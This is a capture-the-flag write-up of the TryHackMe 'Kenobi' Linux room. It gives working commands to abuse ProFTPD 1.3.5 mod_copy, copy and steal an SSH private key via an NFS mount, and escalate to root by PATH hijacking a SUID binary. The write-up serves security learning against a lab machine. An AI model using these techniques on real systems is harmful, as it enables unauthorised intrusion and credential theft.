---
title: "Kenobi - TryHackMe"
description: "Writeup of Kenobi, a Linux machine exploring Samba, ProFTPD, and privilege escalation via SUID."
pubDate: 2024-10-18
platform: "tryhackme"
category: "rooms"
difficulty: "easy"
os: "linux"
language: en
tags: ["samba", "proftpd", "suid", "nfs"]
retired: false
heroImage: "/images/writeups/tryhackme/kenobi.jpg"
---

# Kenobi - TryHackMe Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: TryHackMe

## Reconnaissance

```bash
nmap -sC -sV -oA kenobi 10.10.10.50
```

**Open ports:**
- 21/tcp (FTP - ProFTPD 1.3.5)
- 22/tcp (SSH)
- 80/tcp (HTTP)
- 111/tcp (rpcbind)
- 139/tcp (Samba)
- 445/tcp (Samba)
- 2049/tcp (NFS)

## Enumeration

### Samba

```bash
nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.10.50

smbclient -L //10.10.10.50
```

**Share found:** `anonymous`

```bash
smbclient //10.10.10.50/anonymous
get log.txt
```

The `log.txt` file reveals information about ProFTPD and an SSH key.

### NFS

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.50
```

**NFS Shares:**
- `/var`

## Exploitation

### ProFTPD 1.3.5 - mod_copy

ProFTPD 1.3.5 has the `mod_copy` module that allows copying files without authentication.

```bash
nc 10.10.10.50 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### Mount NFS and get the key

```bash
mkdir /mnt/kenobi
mount 10.10.10.50:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
```

### SSH with stolen key

```bash
ssh -i id_rsa kenobi@10.10.10.50
```

**User flag:**
```bash
cat /home/kenobi/user.txt
```

## Privilege Escalation

### Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

We find `/usr/bin/menu` with SUID.

### Binary analysis

```bash
strings /usr/bin/menu
```

The binary executes commands without absolute path.

### Exploit

```bash
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
# Select option 1
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusion

Kenobi teaches:
- Enumeration of common services (Samba, NFS, FTP)
- ProFTPD mod_copy exploitation
- Escalation via SUID binaries
- Importance of using absolute paths in scripts
